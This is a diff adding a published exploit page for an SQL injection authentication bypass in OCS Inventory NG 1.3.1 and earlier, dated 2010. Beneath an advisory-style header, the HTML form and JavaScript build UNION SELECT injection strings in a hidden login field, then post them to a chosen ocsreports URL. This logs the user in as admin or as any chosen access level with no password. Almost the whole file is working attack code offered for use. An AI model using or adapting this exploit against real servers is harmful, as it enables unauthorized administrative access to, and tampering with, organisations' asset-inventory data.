@@ -1,0 +1,85 @@
+<!--
+____________________________________________________________________________________________________
+
+OCS Inventory NG Server <= 1.3.1 (login) Remote Authentication Bypass
+____________________________________________________________________________________________________
+
+ Software       : Open Computer and Software (OCS) Inventory NG
+ Download       : http://www.ocsinventory-ng.org/
+ Discovered by	: Nicolas DEROUET (nicolas.derouet[gmail]com)
+ Discover       : 2010-02-05
+ Published      : 2010-02-17
+ Version        : 1.3.1 and prior (except 1.02.1 to 1.02.3)
+ Impact	        : Manipulation of data
+ Remote	        : Yes (No authentication is needed)
+____________________________________________________________________________________________________
+
+-->
+<html>
+<head>
+<title>OCS Inventory NG &lt;= 1.3.1 (login) Remote Authentication Bypass</title>
+<script>
+  function $(id) { return document.getElementById(id); }
+  function $$(id) { return $(id).options[$(id).options.selectedIndex].value; }
+  function bypass()
+  {
+    $('log').action = $('ocsreports').value + $$('meth') + '?lang=' + $$('lang');
+    if ($$('type') == 0)
+      $('login').value = "' UNION SELECT id, accesslvl, '' FROM operators WHERE id='" + $('user').value;
+    else
+      $('login').value = "' UNION SELECT '" + $('user').value + "', '" + $$('type') + "', '";
+    $('pass').value = "";
+    if ($$('meth') == 'header.php')
+      alert('Please go to "' + $('ocsreports').value + '" (or click on the OCS logo) !');
+  }
+</script>
+</head>
+<body>
+<form name="log" id="log" action="#" method="post">
+  <table align="center" border="0" width="450px">
+  <tr>
+    <td><b>OCSReports :</b></td>
+    <td>
+      <input type="text" id="ocsreports" size="40" value="http://127.0.0.1/ocsreports/" />
+    </td>
+  </tr>
+  <tr>
+    <td><b>Version :</b></td>
+    <td><select id="meth">
+          <option value="index.php" selected>&lt;= 1.02 --- 1.3b2 &lt;=> 1.3b3</option>
+          <option value="header.php">&lt;= 1.0 (4100) --- 1.3b2 &lt;=> 1.3.1</option>
+        </select>
+    </td>
+  </tr>
+  <tr>
+    <td><b>Login :</b></td>
+    <td><input type="text" id="user" size="40" value="admin" /></td>
+  </tr>
+  <tr>
+    <td><b>Type :</b></td>
+    <td><select id='type'>
+          <option value=0>Default (if login exists)</option>
+          <option value=1>Administrator</option>
+          <option value=2>User</option>
+          <option value=3>Local user</option>
+        </select></td>
+  </tr>
+  <tr>
+    <td><b>Language :</b></td>
+    <td><select id="lang">
+          <option value="english" selected>English</option>
+          <option value="french">French</option>
+          <option value="german">German</option>
+          <option value="spanish">Spanish</option>
+        </select>
+    </td>
+  </tr>
+  <tr>
+    <td><input type="hidden" name="login" id="login" />
+        <input type="hidden" name="pass"  id="pass"  /></td>
+    <td><input type="submit" name="subLogin" onclick="bypass();"></td>
+  </tr>
+  </table>
+</form>
+</body>
+</html>
